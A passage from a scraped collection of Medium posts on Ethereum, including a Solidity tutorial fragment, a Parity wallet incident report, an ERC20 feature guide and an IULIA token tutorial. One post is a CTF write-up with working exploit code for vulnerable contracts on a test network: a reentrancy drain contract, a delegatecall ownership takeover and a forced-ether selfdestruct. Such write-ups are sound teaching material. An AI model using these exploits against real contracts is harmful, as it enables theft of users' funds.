lunch.totalCost.call().then(obj=>obj.c[0])(3) Let two of your friends attend, accounts[1] & accounts[2]lunch.attend.sendTransaction({from:accounts[1]})lunch.attend.sendTransaction({from:accounts[2]})(4) Check the seats left, and check the attendance of accounts[1] and accounts[3]lunch.getAvailable.call()// or lunch.getAvailable.call().then(obj=>obj.c[0])lunch.checkAttendance.call(accounts[1], {from:accounts[0]})lunch.checkAttendance.call(accounts[3], {from:accounts[0]})(5) Finally, split the costslunch.splitCost.call()// Or lunch.splitCost.call().then(obj=>obj.c[0])Thanks for your time~Please feel free to leave any guidance or thought in the comment, if you like this tutorial or anything you found me wrong. :)All the codes can be found here.Please also read the great tutorial from ConsenSys, here, who enlightened me as well as granted me the chance to unashamedly write up this tutorial. The skeleton of my tutorial is based on theirs for sure.", "responses": 1, "tags": ["Ethereum", "Solidity", "Blockchain", "Smart Contracts", "Truffle"]}, {"title": "How to join the Dispatch Developer Evangelist Program", "post_link": "https://medium.com/@zanewithspoon/how-to-join-the-dispatch-developer-evangelist-program-b3879cc3dce?source=search_post", "author_name": "Zane Witherspoon", "author_link": "https://medium.com/@zanewithspoon", "publish_date": "2018-10-24", "last_modified_date": "2018-10-24", "readtime": "1.32", "claps": 292, "voters": 35, "content": "How to join the Dispatch Developer Evangelist ProgramOr how I learned to stop worrying and spread the protocolZane WitherspoonFollowOct 24, 2018 \u00b7 2 min readClass is in session taught by Professor youIn preparation for the upcoming launch of our Mainnet, Dispatch is officially launching our Developer Evangelist Program. Our goal is to help current and aspiring Developers learn how to build data-centric Dapps for the Dispatch protocol. As a Dispatch Evangelist, you will be on the front lines developing a vibrant global community of Dispatch Dapp Developers.So how do you know if you should become a Developer Evangelist?\u26d3 You want to expand your Solidity programming knowledge\ud83d\udcbb You live to code and teach what you know\ud83e\udd13 You read crypto white papers for fun\ud83d\udc69\u200d\ud83c\udfeb You want to become a smart contract or blockchain expert\ud83d\uddfa You want to have a high impact on the Dispatch roadmap\ud83d\udcad You truly believe in Dispatch\u2019s team, vision, and techWhat\u2019s in it for you?\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc66 Integration to the Dispatch family\ud83c\udfe0 Assistance with securing locations for your developer meetups\ud83c\udf81 Free Dispatch Developer Kit\ud83d\udd2c Exclusive Dispatch product and technical updatesYour Core Responsibilities:\u270c\ufe0f Run two monthly in-person Dispatch meetups\ud83d\udcf9 Livestream each meetup on at least one social network, such as YouTube, Facebook, or Twitter\ud83e\udd1d Introduce us to interested Dapp developers\ud83d\udc69\u200d\ud83c\udfeb Lead in-person Solidity trainings for your course attendeesWe will be launching our Developer Evangelist program with five evangelists to start and adding more over time. We are accepting applications now. We are excited to have you join us as part of our family. We look forward to meeting you!If you\u2019re excited about the Dev Evangelist program give us some\ud83d\udc4f or a share. Have an opinion or feedback? We want to hear it. Join the conversation on Discord or Telegram", "responses": 0, "tags": ["Ethereum", "Developer", "Blockchain", "Solidity", "Dapps"]}, {"title": "The Ethernaut CTF Writeup", "post_link": "https://blog.positive.com/the-ethernaut-ctf-writeup-dc3021824abc?source=search_post", "author_name": "Arseny Reutov", "author_link": "https://blog.positive.com/@theRaz0r", "publish_date": "2017-11-06", "last_modified_date": "2018-06-11", "readtime": "5.23", "claps": 204, "voters": 35, "content": "The Ethernaut CTF WriteupArseny ReutovFollowNov 6, 2017 \u00b7 6 min readZeppelin Solutions invited everybody to participate in their smart contract CTF competition called \u201cThe Ethernaut\u201d which started together with the annual DevCon 3 conference held in Cancun. First five contestants to solve all tasks shared the prize pool of 10000$.For each task the Ethernaut bot created a contract on Ropsten testnet. At Positive.com we could not miss a chance to take part in the CTF, so here is our writeup for the seven tasks presented to the contestants.0. Hello EthernautThe first task was designed to get comfortable with the CTF and contract interaction. In Chrome Dev Tools you were welcomed with shiny ASCII graphics:After the first contract was deployed, you needed to call info() method, which instructed about the further steps: \u201cYou will find what you need in info1().\u201d. Calling info1() told us: \u201cTry info2(), but with \u201chello\u201d as a parameter.\u201d, which then required the following sequence of calls:contract.info2(\u201chello\u201d) \u2192 The property infoNum holds the number of the next info method to call.contract.infoNum() \u2192 42contract.info42() \u2192 theMethodName is the name of the next method.contract.theMethodName() \u2192 The method name is method7123949.contract.method7123949() \u2192 If you know the password, submit it to authenticate().At this point we needed to get the password for the authenticate() function. We got the password by analyzing the contract memory in Remix debugger.However, it could be done easier by just calling contract.password() which yielded the value \u201cethernaut0\u201d. After authenticating with this password we successfully proceeded to the next task.1. FallbackTo beat this level one needed to become the contract owner and drain its balance. It had the function withdraw() which could transfer all the balance to the caller but it was restricted only to the owner. Surprisingly the fallback function could make us contract owner:function() payable {  require(msg.value > 0 && contributions[msg.sender] > 0);  owner = msg.sender;}As you may know fallback function is called every time a contract receives ether or an unknown method is called. Thus, by sending ether to the contract we could trigger fallback function, however require() statement would not let us become the owner as \u201ccontributions\u201d mapping had zero value for our address. In order to increase our contribution we just needed to call the corresponding method:function contribute() public payable {  require(msg.value < 0.001 ether);  contributions[msg.sender] += msg.value;  if(contributions[msg.sender] > contributions[owner]) {    owner = msg.sender;  }}The task could be solved with the following sequence of calls:contract.contribute({value: 100})contract.sendTransaction({value: 100})contract.withdraw()2. FalloutIn order to solve this task one needed to set oneself as contract owner. If you looked closely at the constructor name you could easily spot the problem: letter \u201cl\u201d in contract name \u201cFallout\u201d was changed for digit \u201c1\u201d in constructor name which means that pseudo-constructor was never executed. That is why it was possible to call function \u201cFal1out\u201d and effectively set yourself as the contract owner. Submitting solution to the Ethernaut bot got us to the next task.3. TokenThe task was about a classic integer underflow. The transfer() method did not check that the current user balance is bigger than supplied value. Thus, by calling the method with any address as the argument and supplying any amount of ether with that call we could make our balance as big as 2**256 which was the task goal.4. DelegationThe name of the task implied the connection with the notorious Parity hack. Indeed, the fallback function had the code that looked familiar:function() {  if(delegate.delegatecall(msg.data)) {    this;  }}The difference between a normal call and delegatecall is that the latter passes the current context to the target method call, which means that in delegated method msg.sender will point to the original sender and not the caller contract. The second point is that this fallback function passes user supplied msg.data to delegatecall, allowing to basically call any function within delegate contract if we supply the correct method signature. The goal was to call the \u201cpwn\u201d method which could change the owner:function pwn() {  owner = msg.sender;}In order to call this function we needed to figure out its signature which could be calculated as follows:web3.sha3(\"pwn()\").slice(0, 10) // 0xdd365b8bSending these 4 bytes in \u201cdata\u201d field of the ether transfer transaction made us the owner and allowed to proceed to the next task.5. ForceThe vulnerable contract had no code at all but featured a cool ASCII cat:pragma solidity ^0.4.0;contract Force {/*MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =\u00f8= / (______)__m_m)*/}The goal of the task was to make the contract balance bigger than zero. Since there was no payable fallback function, we could not send ether directly. However, with selfdestruct() builtin function it is possible to send ether even if there are no payable functions. The purpose of this function is to delete the contract from the blockchain. When it is executed it sends the contract balance to the address that is supplied in the first argument.In order to solve the task we created the following exploit contract:contract Suicide {    function Suicide() payable {        selfdestruct(0x24d661beb31b85a7d775272d7841f80e662c283b);    }}Having been deployed with initial balance of 1 wei, it immediately removed itself from the blockchain and sent its balance to the Force contract, which happily accepted our transfer.6. Re-entrancyAs it is clear from the task name, the goal was to exploit a reentrancy vulnerability and drain the contract balance. The same vulnerability affected the DAO which resulted in 50 million dollar theft.The relevant piece of code was as follows:function withdraw(uint _amount) public {  if(balances[msg.sender] >= _amount) {    if(msg.sender.call.value(_amount)()) {      _amount;    }    balances[msg.sender] -= _amount;  }}As it is quite evident, the code is vulnerable because balance deduction is done after ether transfer is made. When ether is sent to some address, it may be a contract address and its fallback function will be triggered. In this function it is possible to recursively call withdraw() method again provided that there is enough gas. It looks like this:Our exploit contract firstly made a deposit and then successfully drained the contract balance by triggering the recursive chain of withdraw() calls via fallback function:import './Reentrance.sol';contract Exploit {    address target = 0x2bd292597661ef87e2045c474de35851eb5a65f2;    Reentrance c;    function Exploit() {       c = Reentrance(target);           }    function attack() payable {       c.donate.value(0.1 ether)(this);       c.withdraw(0.1 ether);    }    function() payable {        c.withdraw(0.1 ether);    }}Having submitted the final solution, we were congratulated with the fancy message:We finished second overall (0x949db1e44b7762683d1cf947d2b3c2358bd7434a), 7 minutes behind the first submitter. We would like to thank Zeppelin Solutions for the great tasks and the contribution they are making towards secure smart contract development. If your ICO needs professional security assessment & protection, do not hesitate to contact Positive.com.", "responses": 2, "tags": ["Ethereum", "Solidity", "Security", "Blockchain"]}, {"title": "Parity Wallet Security Alert \u2014 Vulnerability in the Parity Wallet library contract", "post_link": "https://medium.com/crypt-bytes-tech/parity-wallet-security-alert-vulnerability-in-the-parity-wallet-service-contract-1506486c4160?source=search_post", "author_name": "Priyab Dash", "author_link": "https://medium.com/@bobquest33", "publish_date": "2017-11-07", "last_modified_date": "2018-05-12", "readtime": "5.95", "claps": 147, "voters": 33, "content": "Parity Wallet Security Alert \u2014 Vulnerability in the Parity Wallet library contractPriyab DashFollowNov 7, 2017 \u00b7 6 min readIn another sad twist of fate again the Parity Multi-sig wallets came under another critical bug or shall I say defect/hack where a user exploited an issue and thus removed the library code. This froze funds in all Parity multi-sig wallets deployed after 20 July. For now the funds are frozen & can\u2019t be moved anywhere. Some speculate that this may impact 150+ Million USD worth of ETH. The exploit seems to be significant as a lot of customer funds are frozen who either pool funds or ICOs that use the Parity\u2019s multi-sig capability to store funds.The UpdatesThis was the first update from Parity was belowWhich was followed by he below official security alert detailing the nature of the exploitAnd statement of the issue was as mentioned below:Following the fix for the original multi-sig issue that had been exploited on 19th of July (function visibility), a new version of the Parity Wallet library contract was deployed on 20th of July. However that code still contained another issue \u2014 it was possible to turn the Parity Wallet library contract into a regular multi-sig wallet and become an owner of it by calling the initWallet function. It would seem that issue was triggered accidentally 6th Nov 2017 02:33:47 PM +UTC and subsequently a user suicided the library-turned-into-wallet, wiping out the library code which in turn rendered all multi-sig contracts unusable since their logic (any state-modifying function) was inside the library.Who Did itFrom the below issue raised in Parity github issue log the issue was done by a user who goes by github handle devops199.anyone can kill your contract \u00b7 Issue #6995 \u00b7 paritytech/parityparity - Fast, light, robust Ethereum implementation.github.comFrom the his github repo though not much public commits can be confirmed, but based on what he has achieved, by that some call him a hacker.devops199devops199 has 3 repositories available. Follow their code on GitHub.github.comFrom the issue log one can see that the suicide code was called onto a live contract which seems to be a library which was called from other Parity multi-sig wallets.Ethereum Account 0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4 InfoContract Source Code Copy Find Similiar Contracts //sol Wallet // Multi-sig, daily-limited account proxy/wallet. //\u2026etherscan.ioAnd the developer devops199 was able to make himself as the owner of the library contract because the contract was uninitialized and he chose to call the suicide wallet.Ethereum Transaction 0x47f7cff7a5e671884629c93b368cb18f58a993f4b19c2a53a8662e3f1482f690The Ethereum BlockChain Explorer, API and Analytics Platformetherscan.ioHe seemed to act like a hacker trying to exploit July 19 bug and found the below multi_sig wallets deployed using Parity were using the library located at \u201c0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4\u201d address.parity_multi_sigs - Pastebin.comEdit descriptionpastebin.comSo he killed the contract and then when he queried the dependent contracts \u201cisowner(<any_addr>)\u201d they all return TRUE because the delegate call made to a died contract to allegedly test the exploit.This is the transaction that tracks the suicide call.Ethereum Transaction 0x47f7cff7a5e671884629c93b368cb18f58a993f4b19c2a53a8662e3f1482f690The Ethereum BlockChain Explorer, API and Analytics Platformetherscan.ioThe most funny part was that he did not understand the gravity of the issue and felt by deleting the contract he has stopped an exploit from re-occurring while he himself already triggered the exploit and that to on a production live contract, at least that was what his statement seemed to mean. It seems the developer was unaware of the consequences.I believe some one might exploit.ImpactNo funds can be moved out of the multi-sig wallets for all dependent multi-sig wallets that were deployed after 20th July. Below is full list of affected wallets (151 addresses) and their balances (513,743 eth or $152 million total) collected by crypto eli5. Hence this is approximate amount in quantifiable sense that has been affected.But the most immediate affected ICO seems to be Polkadot ICO.Parity Wallet Struck Again by Critical Vulnerability - CryptovestParity multisig wallets again revealed a critical vulnerability, locking in thousands of Ethereum and affecting the\u2026cryptovest.comPolkadot ICO had recently raised around 130 Million worth funds which may be directly affected because of this issue.Polkadot ICO Raises $130 Million and it Has Only Just BegunThe Polkadot ICO, intended for interoperable blockchains, has raised $130 million in an on-going auction style ICO that\u2026www.trustnodes.comThough they have clarified that affected multi-sig wallet that had their funds does not contain all of the Web3 Foundation\u2019s funds; so their ability to build Polkadot as planned based on the original timetable has not been affected.From the social mediaSeems some parody accounts now have cropped up who now post as devops199, with whom I have been chatting in public room. He has clarified that this below handle is not him.devops199 (@devops199) | TwitterThe latest Tweets from devops199 (@devops199). Parity Account (see what I did there? Parody)twitter.comFunny Tweets capturing some of the conversation by the alleged developer who found the exploitFrom the above conversation it seems the developer was doing some research on the July 19 multi-sig hack on the Production Ethereum Blockchain which can easily reflects the developer\u2019s noob-ness.But one has to understand that despite the exploit that the devops199 has found or created,he is been cooperative and can\u2019t be fully blamed for what happened. Though sites like coindesk and techcrunch are headlining with stuff like Ethereum Hacked or parity wallet hacked (20% of the nodes hacked). And that has already impacted market sentiment.What went WrongIt seems to be the crux of the parity multi-sig issue is that the share library contract was destroyed because it allowed initWallet( ) to be called on itself, directly. Making it a functioning wallet instead of just a library that other wallets can use. At the moment, though the funds seems frozen in the multi-sig wallets, multi-sig wallets are still the owners of the ether. They just currently lack a withdraw( ) function to transfer them elsewhere. Because the code they need to use to withdraw their funds has been \u2018deleted\u2019. The fact that 0x863 also had contract Wallet { } is where the trouble started.Call for Hard-forkWhile some are of the view one could \u201crepair\u201d the existing ones by pointing them at a newly deployed library they still have funds, and update the wallets to use the new one. But you just can\u2019t update those deployed wallets without a fork.With almost 150 million USD worth of ETH stuck \u201cfrozen\u201d in these multi-sig wallets many of the investors are now calling for a Hard-fork to bailout the frozen funds.Technically the multisig wallets called a different contract (stored in _walletLibrary, hence the use of the name library). It\u2019s been deleted.Depending on what one means by \u2018update\u2019 a future hard fork adding recovery features might be able to help with this. They can deploy a new one, but it won\u2019t have the same address. The fork would be to update the wallets to point to the new one.But it\u2019s looking like they are stuck forever if that doesn\u2019t happen.For now only a hard fork which puts back the \u201clibrary contract\u201d in an initialized state would resolve this. Either way, this isn\u2019t looking too good for Ethereum. Some feel, it can be quite a bit nastier to recover the funds. The fork would have to reinstate the whole \u201cnot-library\u201d at the exact same address, and with its prior stored values. It could still be done, but it\u2019s not as simple as updating the wallets to a new library.Legal AngleParity Wallet Security Alert \u2014 Vulnerability in the Parity Wallet library contractIn another sad twist of fate again the Parity Mutisig wallets came under another critical bug or shall I say defect\u2026medium.comSome are already calling devops199 as a hacker who wanted to steal funds and others were looking at the legal ramifications of the current exploit and how it has played. Though there is a larger consensus that devops199 may not be persecuted but only time will tell.From this updated assessment from a chat room its possible devops199 may be in lot of trouble as he was recreating the july Hack on real wallets like a Black hat hacker :looking closer, on polkadot alone, with their $90m USD balance, he called kill( ) first, then changeOwner( ) to himself 3 times, and then tried to do the delegate call to send himself 100 ETH (repeating the july hack) twice.FinallyDespite the raging controversy, it\u2019s not a problem with Ethereum, but it is a problem with the image of Ethereum, as most people may not see the difference. While some say the biggest loser out of this currently is an Ethereum co-founder, that its pretty guaranteed. Parity & Polkadot are the biggest losses for ETH. If there is one thing this event has brought, it is spicy memes. Just minutes after the library was wiped out, devops199 raised an issue at parity\u2019s github titled \u201canyone can kill your contract.\u201d \u201cI accidentally killed it,\u201dThere are also fears of legal trouble for devops199 but at the end it is one of the unfortunates issues of open source Parity wallet whose multi-sig capability seems to be cursed where the lightning of exploits has struck twice and there may be more.As someone in a chat room said:Hundreds of millions of $ Wiped out by $0.27", "responses": 3, "tags": ["Blockchain", "Ethereum", "Parity", "Exploit", "Solidity"]}, {"title": "Beyond ERC20 \u2014 A guide to non-standard Ethereum token functionality", "post_link": "https://medium.com/@ptrwtts/beyond-erc20-a-guide-to-non-standard-ethereum-token-functionality-bef5b9a9d457?source=search_post", "author_name": "Peter Watts", "author_link": "https://medium.com/@ptrwtts", "publish_date": "2018-02-15", "last_modified_date": "2018-05-29", "readtime": "5.58", "claps": 264, "voters": 34, "content": "Beyond ERC20 \u2014 A guide to non-standard Ethereum token functionalityPeter WattsFollowFeb 15, 2018 \u00b7 6 min readEthereum ERC20 tokens are often talked about as a single category, but if you dig into the source code of the most popular tokens, you\u2019ll actually find that there\u2019s an incredible amount of diversity between them. The ERC20 standard merely outlines a minimum set of functionality that a token must adhere to. Most tokens go beyond this, adding all sorts of features. This post attempts to document this landscape of \u201cnon-standard\u201d functionality, to show what\u2019s already being used in the wild, and give a glimpse of what the future holds.Note: the focus is on classic, fungible tokens, rather than non-fungible ones.ERC20Before jumping into the non-standard, let\u2019s take a quick look at the standard. A token that adheres to the ERC20 spec implements the following functions:totalSupplyGet the total token supplybalanceOf Get the token balance of an addresstransferSend tokens to another addressapprove Give another address permission to spend a certain allowance of tokensallowanceCheck the allowance that one address has for anothertransferFromSpend the allowance that one address has for anotherThat\u2019s it. These are the only required functions.Common AdditionsThis next set of features may not be standardized, but nearly every token includes one or all of them. Where possible, I\u2019ve included links to the source code of at least one major token implementing the feature, so you can see how it works.Minting / Crowd SalesMost tokens need a way to establish the initial allocations. Typically, this either done by building distribution / crowdsale logic directly into the token contract [SNT, RDN, REQ], or by including a generic mint() function that can be called by an external contract [OMG].PausingIn many cases, a developer doesn\u2019t want their token to be transferable during some initial period (e.g. while a crowdsale is taking place), so they include the ability to pause/unpause transfers [MANA].OwnershipIt would be problematic if any user could arbitrarily mint or pause the token, so an ownership model is usually included, that limits certain actions to the owner [KNC].BurningMany tokens include some form of burning in their economic model. Rather than do it unofficially, they introduce a burn() function, that keeps the token\u2019s \u201ctotalSupply\u201d value up to date [QSP].Unlimited AllowanceA common pattern when using approve() is to grant a very large allowance to a trusted contract (e.g. this is how the 0x protocol works). To make this simpler, some tokens consider an allowance equal to MAX_UINT to be unlimited [ZRX].Increase / Decrease ApprovalOne problem with the approve() function is that it\u2019s vulnerable to a front-running attack when trying to update an existing allowance. To avoid this, newer tokens use increaseApproval() and decreaseApproval() [LINK].Advanced FeaturesNow we\u2019re getting to the fun stuff. These features are rarer, but can add significant flexibility to a token.Vesting / Time lockingOften the creators opt to have their tokens subject to a vesting schedule [ANT] or time lock [OMG] that prevents them from immediately transferring them. Vesting can either be built directly into the token, or implemented with a dedicated contract that holds the locked tokens.Upgrading / MigratingIf something were to go wrong, or a new token standard was to emerge (see below), a token issuer may wish to upgrade [PPT] or migrate [GNT] the token to a new address.CloningThis one is weird / cool. Tokens that are built off the MiniMe library [SNT, ANT, SWT] have the ability to be cloned, with the new token taking on a distribution equal to the original token\u2019s distribution at any previous block.Restricted OwnershipSecurities tokens are becoming increasingly popular, however they come with the limitation that only accredited investors can hold them. To support this, protocols like R-Token extend ERC20 to only allow transfers from addresses that have been whitelisted in a registry.LiquidityThe Bancor token [BNT] implements a continuous supply model that allows you to buy and sell tokens directly from the smart contract, which holds Ether in reserve, and dynamically sets a price based on supply and demand.Delegated TransfersHolding ETH in order to pay gas fees on token transfers can be inconvenient for end-users. As a workaround, tokens can allow transfers to be submitted by a 3rd party, who pays the gas and collects a token fee off the user [PROPS].Potential Future StandardsMany of the features mentioned above don\u2019t need to become standards. It is perfectly OK to implement them ad-hoc, depending on the needs of the token. But other features, particularly those that establish new patterns for how tokens and contracts should interact, would benefit from becoming standardized.Transfer And CallIf you want to send ERC20 tokens to a smart contract, and have it do something with those tokens, it currently takes two transactions. First the user \u201capproves\u201d an allowance for the contract, and then the contract utilizes the tokens via the \u201ctransferFrom\u201d function.To get around this, some tokens implemented \u201capproveAndCall\u201d, which triggers a \u201creceiveApproval\u201d function in the receiving contract, allowing it to use the tokens in the same transaction. However, it never really took off as a widely adopted standard, and as a result, not many contracts handle it.Since then, there have been many more attempts to add this elusive functionality, including ERC223, ERC677, ERC777 and ERC827, but none have managed to reach consensus, or see widespread deployment.Preventing Token LossWhen you send Ether to a contract that can\u2019t handle it, the transaction fails. But if you do the same with tokens, they get trapped in the contract forever. This has led to millions of dollars worth of tokens getting lost. You can see for yourself by visiting the Etherscan page of any token, and looking at it\u2019s token balances (e.g. EOS has $800,000 trapped).Many newer token contracts add functions that allow the owner to recover any tokens that are accidentally sent to it [FUN, BNT, KNC]. However, this is just a patch, and doesn\u2019t prevent tokens being sent to other contracts. ERC223 and ERC777 (discussed in more depth below) attempt to solve this by requiring contracts to explicitly indicate that they accept tokens, and aborting the transfer if they don\u2019t.However, there is still ongoing debate over exactly how and when these scenarios should be handled, so nothing has been standardized yet.Tokens 2.0Amongst all the debate, there are two clear contenders with the potential to become the next standard in Ethereum tokens.ERC223Initially proposed almost a year ago, this standard aimed to address the two major issues mentioned above (transfer and call + lost tokens). However, the key supporters do not see backwards compatibility with ERC20 tokens and contracts as a high priority, instead emphasizing the need to move on:The point of a new standard is to NOT be compatible with ERC20 because ERC20 has design flaws.This philosophy has caused a lot of disagreement (which is ongoing to this day), and as a result, adoption has been slow.ERC777In response to the stagnation of ERC223, ERC777 was proposed and has quickly gathered support from the community. In addition to addressing the key shortcomings of ERC20 (while maintaining full backwards compatibility), it also incorporates some of the learnings around how tokens are being used in the wild. This includes creating a standard for common actions like minting/burning, and formalizing the concept of \u201cauthorized operators\u201d who can spend on your behalf.For a more in-depth look at ERC777, check out this summary reddit post, or read the official issue on Github.While it has promising momentum, it\u2019s important to note that it is still being finalized, and there are no major tokens implementing it yet (Aragon platform tokens may be one of the first).TakeawaysIf you\u2019re implementing a token, here are some things to keep in mind:ERC20 is still king. No other standard has settled yet.If you want to influence future standards, get involved with ERC777Don\u2019t be afraid to include non-standard functionality if you think it will benefit your users. Just make sure it\u2019s audited!Speaking of which, if you were clicking the links through to source code, you may have noticed a lot of similar looking functions between tokens. That\u2019s because nearly all of them are based off one of these battle-tested libraries:OpenZeppelin [OMG]MiniMe Token [SNT]Consensys [QTUM]DS Token [EOS]Not only can you get an ERC20 template from these libraries, OpenZeppelin also offers ready made implementations of many non-standard features too.Missing something?Everything discussed above is probably just scratching the surface of Ethereum token functionality that\u2019s out there in the wild. If you know of something else interesting, leave a comment or send me a tweet @ptrwtts", "responses": 3, "tags": ["Ethereum", "Erc20", "Cryptocurrency", "Solidity"]}, {"title": "Writing Smart Contracts in IULIA", "post_link": "https://medium.com/@chriseth/writing-smart-contracts-in-iulia-2a5ba737c7f1?source=search_post", "author_name": "Christian", "author_link": "https://medium.com/@chriseth", "publish_date": "2017-12-19", "last_modified_date": "2018-06-17", "readtime": "7.92", "claps": 357, "voters": 34, "content": "Writing Smart Contracts in IULIAChristianFollowDec 19, 2017 \u00b7 8 min readPeople keep asking about the status of our new low-level language IULIA and are often surprised when I tell them that it is already used in the Solidity compiler. Perhaps you have even used IULIA in the past without noticing. The reason is that IULIA shares a lot of code and structure with what was previously called \u201cinline assembly\u201d. For the compiler, the distinction between the two is often not even noticeable.Since people sometimes like writing smart contracts very close to the metal (or rather close to the ether), I would like to explain how you can use IULIA to write smart contracts directly. Or perhaps almost directly. One component is missing for writing smart contracts in IULIA and that is the ability to reference code from within code. This is needed for the deployment (\u201cconstructor\u201d) part of a smart contract. We already have a specification about that, but it is not yet implemented in the Solidity compiler.Because of that, I will use the inline assembly tools for Solidity so that the compiler will create the necessary wrappers for us. Using IULIA inside of Solidity instead of stand-alone also has the benefit that we can use existing Solidity tools like the remix IDE and debugger.Since IULIA is designed to compile to different backends including the EVM but also Ethereum-flavoured WebAssembly, it comes with a certain set of built-in functions which are not exactly the EVM opcodes. While these built-in functions are not yet implemented, there is a flavour of IULIA which uses EVM opcodes instead of the built-in functions and is currently used as inline assembly for Solidity and also inside the compiler. Translating these opcodes to fully-fledged IULIA built-ins will be trivial, though.So what we are doing here is that we are using the syntactic elements of IULIA, remove types and replace the built-in functions by the EVM opcodes (in functional notation).As an example, we will implement a simple ERC20 token contract. Let us start with the surrounding Solidity code:interface ERC20 {  function totalSupply() constant returns (uint totalSupply);  function balanceOf(address _owner) constant    returns (uint balance);  function mint(address _addr, uint _value);  function transfer(address _to, uint _value);}contract MyToken {  function MyToken() {    assembly {      // init code comes here    }  }  function() payable {    assembly {      // runtime code comes here    }  }}This snippet defines the ERC20 token interface (we will use that later to interface with the contract) and a skeleton for our own token. This is the only code we will write in Solidity.If you want to try it out, paste it into https://remix.ethereum.org, switch to the \u201crun\u201d tab, select MyToken and click \u201ccreate\u201d. This creates a contract without any interface. We will later implement the ERC20 interface as specified above, although that will not be visible to the compiler. Because of that, we have to nudge remix a little: Click the \u201cclipboard\u201d symbol next to the MyToken contract just created to copy its address into the clipboard. Then paste the address into the input field next to \u201cAt address\u201d. Next, select the \u201cERC20\u201d interface in the drop-down element just above it and click \u201cAt address\u201d. Now you should have a new ERC20 instance with buttons for all the functions that are part of the interface. If you click one of these buttons now, the relevant function on MyToken will be called (just that it is not implemented yet).OK, now on to implementing those functions. First, we have to come up with how we want to use storage.Slot 0: owner / creatorSlot 1: total balance (we have to update this all the time)Slot 0x1000 + address: account balancesAfter having verified that there will be no overlap in storage, we can start with the creation code:contract MyToken {  function MyToken() {    assembly {      // Store the creator at storage slot zero      sstore(0, caller())    }  }  // ...}The IULIA snippet will result in the following stream of opcodes:CALLER PUSH1 0 SSTOREThis stores the caller/sender/creator in the first storage slot. The functional notation is probably much easier to read, but essentially, all components in such an expression are turned into EVM opcodes by just reading from right to left, ignoring any parenthesis structure. The main thing the compiler does for you is checking that the number of arguments (and later their types) matches the parameters.The next this we will do is implement an accidental Ether transfer to our token:contract MyToken {  function MyToken() {    // ...  }  function () payable {    assembly {      // Protection against sending Ether      if gt(callvalue(), 0) { revert(0, 0) }      // ...    }  }}If-statements take a single expression as condition and if it evaluates to non-zero (with introduction of types, it will check against true/false), the body is executed and skipped otherwise. This snippet reverts the call if it contains a nonzero Ether transfer.After that, we have to read the calldata and decide which function is to be called. This is called a function dispatcher. IULIA has a convenient switch statement for that purpose (I will omit the Solidity code surrounding the IULIA code from now on):// Protection against sending Etherif gt(callvalue(), 0) { revert(0, 0) }// Dispatcherswitch selector()case 0x70a08231 /* \"balanceOf(address)\" */ {  returnUint(balanceOf(decodeAsAddress(0)))}case 0x18160ddd /* \"totalSupply()\" */ {  returnUint(totalSupply())}case 0xa9059cbb /* \"transfer(address,uint256)\" */ {  transfer(decodeAsAddress(0), decodeAsUint(1))}case 0x40c10f19 /* \"mint(address,uint256)\" */ {  mint(decodeAsAddress(0), decodeAsUint(1))}default {  revert(0, 0)}So far, so boring. But actually not: What you might have noticed is that this code uses identifiers which are not EVM opcodes, but their syntax is exactly the same. This is also why we can talk about IULIA and Solidity inline assembly more or less interchangeably: The core language allows the user to define functions (more on that below), but there is not a single built-in language, not even the EVM opcodes. Then there is the actual IULIA flavour that defines some built-in functions and the Solidity inline assembly that uses EVM opcodes as built-in functions. From a semantics standpoint, it does not matter where and how the function is defined, only its semantics matter. Because of that you can have the same code compiling to different backends, have the same optimizer routines, the same simulator and only the way these built-in functions are in the end defined in the target machine is different.You might have noticed the functions called decodeAsAddress, decodeAsUint and returnUint. These handle how calldata is decoded and encodde and we will take a look at them next. By the way, it does not matter whether you first define a function and use it later or define it after it is used, it only needs to be in scope (i.e. not inside a pair of curly braces in a deeper nesting layer).function selector() -> s {  s := div(calldataload(0), 0x100000000000000000000000000000000000000000000000000000000)}function decodeAsAddress(offset) -> v {  v := decodeAsUint(offset)  if iszero(iszero(and(v,        not(0xffffffffffffffffffffffffffffffffffffffff)))) {    revert(0, 0)  }}function decodeAsUint(offset) -> v {  v := calldataload(add(4, mul(offset, 0x20)))}This snippet shows the first real difference between LLL and IULIA: It is possible to define functions and (stack) variables. LLL only knows macros and it is possible to use these macros to define memory variables and things that look similar to functions. Another difference between LLL and IULIA is where the parentheses are placed, but that is just a matter of taste.The function selector() returns the first four bytes of the calldata, properly right-aligned to ease comparisons. The other two decode values of type address and uint256, respectively where the correct value range is checked for the former. In both cases, the argument is the index of the parameter in the ABI starting with zero. For both functions, the return variable is called v and assigned in the first line.Function definitions and calls are an abstract thing in IULIA and they will be mapped to proper functions for WebAssembly. Since the EVM does not have functions, they have to be emulated with jumps, where the return PC and the arguments and return values are placed on the stack. But don\u2019t worry, the compiler will do that behind the scenes and the translation is actually very simple.Note that (internal) function calls in the EVM are rather cheap. The only reason they might be avoided is because they are called with certain arguments where further optimization might be possible for these specific arguments. If you take a look at how decodeAsAddress is used in the balanceOf part of the dispatcher above, you notice an opportunity of optimisation:case 0x70a08231 /* \"balanceOf(address)\" */ {  returnUint(balanceOf(decodeAsAddress(0)))}Since it is called with 0 as argument, which is forwarded to decodeAsUint, which in turn performsv := calldataload(add(4, mul(offset, 0x20))we see that a merecalldataload(4)would do the whole trick.Exactly because of this reason, we are currently working on an optimizing compiler for IULIA that can reduce such cases to much better performing code. Every single stage of the optimizer is easy to understand and can also emit intermediate IULIA code in readable text representation. This makes it possible to even verify the optimized code after the compiler did its job.The other benefit of such an optimizing compiler is that you can write modular code. We could have just usedreturnUint(balanceOf(calldataload(4))but this would have removed the value range check and would also be much more error-prone and harder to maintain. What happens if we want to add another parameter, for example? We would have to re-calculate the proper position in the calldata ourselves all the time.Ok, let us continue with other helper functions. We still need the value encoder:function returnUint(v) {  mstore(0, v)  return(0, 0x20)}This is where we first use this magical thing called \u201cmemory\u201d: It is a semi-volatile, byte-addressed storage. The IULIA compiler will not use it for internals, but knows how to handle it, meaning that concurrent reads and writes will work correctly even after the optimizer changed the code.Now let us add some functions to handle the internal logic of the token:function mint(account, amount) {  if iszero(calledByOwner()) { revert(0, 0) }  mintTokens(amount)  addToBalance(account, amount)}function transfer(to, amount) {  deductFromBalance(caller(), amount)  addToBalance(to, amount)}This basically only calls helper functions. The mint function reverts the call if it is not called by the owner and the transfer function removes an amount from one account and adds it to another account.function owner() -> o {  o := 